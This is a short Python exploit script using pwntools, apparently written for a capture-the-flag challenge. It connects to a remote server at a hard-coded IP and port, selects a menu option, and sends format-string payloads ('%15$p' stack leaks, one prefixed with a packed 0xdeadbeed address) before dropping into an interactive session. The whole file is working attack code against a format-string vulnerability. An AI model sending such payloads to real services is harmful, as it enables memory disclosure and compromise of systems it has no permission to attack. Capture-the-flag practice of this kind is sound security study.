from pwn import *
from string import ascii_letters, digits

host, port = "188.166.215.13", "24234"

conn = remote(host, port)

conn.sendline(b"1")
conn.sendline(b'%15$p')
conn.sendline(b"||||||" + p64(0xdeadbeed) + b"%15$p")
# conn.sendline(ascii_letters.encode())

conn.interactive()